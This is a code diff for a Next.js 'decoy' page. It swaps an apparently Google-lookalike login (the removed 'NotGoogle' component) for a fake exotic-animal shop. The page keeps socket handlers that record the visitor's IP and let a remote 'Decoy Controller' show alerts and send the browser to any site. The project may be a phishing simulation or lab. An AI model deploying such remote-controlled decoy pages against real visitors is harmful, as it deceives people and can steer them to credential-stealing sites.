+++ src/app/decoy/page.jsx
@@ -1,10 +1,10 @@
 'use client';
 import { useEffect, useState } from "react";
 import { socket } from "../socket.js";
-import { useRouter } from "next/navigation";
-import Login from '@/components/login/login';
+import decoyStyles from "./decoy.module.css";
+import { useRouter } from 'next/navigation';
 
-const NotGoogle = () => {  
+const Home = () => {
   const [ipv4, setIpv4] = useState(null);
   const [isConnected, setIsConnected] = useState(false);
   const [transport, setTransport] = useState("N/A");
@@ -32,7 +32,7 @@ const NotGoogle = () => {
       setIsConnected(false);
       setTransport("N/A");
       // Remove event listeners when disconnecting
-      socket.off("alert", handleAlert);      
+      socket.off("alert", handleAlert);
       socket.off("pushToPage", handlePushToPage);
       socket.off("UserList", handleUserList);
     }
@@ -45,12 +45,13 @@ const NotGoogle = () => {
       userList = userList.filter((user) => user !== "Decoy Controller");
       setUserList(userList);
     }
-    function handleAlert(message){
+    function handleAlert(message) {
       console.log("Alerting user with message: ", message);
       alert(message);
+
     }
 
-    function handlePushToPage(site) {      
+    function handlePushToPage(site) {
       router.push(site);
     }
 
@@ -60,8 +61,11 @@ const NotGoogle = () => {
     socket.on("disconnect", onDisconnect);
 
     return () => {
-      socket.off("connect", onConnect);      
+      socket.off("connect", onConnect);
+      socket.off("alert", handleAlert);
+      socket.off("pushToPage", handlePushToPage);
       socket.off("disconnect", onDisconnect);
+      socket.off("UserList", handleUserList)
     };
   }, [ipv4, router]); // Only run this effect once on component mount
 
@@ -83,12 +87,40 @@ const NotGoogle = () => {
     fetchIPv4();
   }, [router]);
 
-  
+
   return (
-    <div>
-      <Login  argument={"notGoogle"}/>
+    <div className={decoyStyles.container}>
+      <div className={decoyStyles.header}>
+        <h1>Welcome to Exotic Animals Emporium</h1>
+      </div>
+      <div className={decoyStyles.main}>
+        <div className={decoyStyles.animalList}>
+          <h2>Available Exotic Animals</h2>
+          <ul>
+            <li>Lion</li>
+            <li>Tiger</li>
+            <li>Elephant</li>
+            <li>Giraffe</li>
+            <li>Monkey</li>
+            {/* Add more exotic animals here */}
+          </ul>
+        </div>
+        <div className={decoyStyles.buyingGuide}>
+          <h2>How to Buy an Exotic Animal</h2>
+          <p>Follow these simple steps to purchase your dream exotic animal:</p>
+          <ol>
+            <li>Choose the animal you want to buy from our list.</li>
+            <li>Contact us via email or phone to inquire about the availability and price.</li>
+            <li>Arrange for the purchase and delivery of your exotic pet.</li>
+            <li>Enjoy your new exotic companion!</li>
+          </ol>
+        </div>
+      </div>
+      <div className={decoyStyles.footer}>
+        <p>&copy; 2024 Exotic Animals Emporium. All rights reserved.</p>
+      </div>
     </div>
   );
 };
 
-export default NotGoogle;
+export default Home;
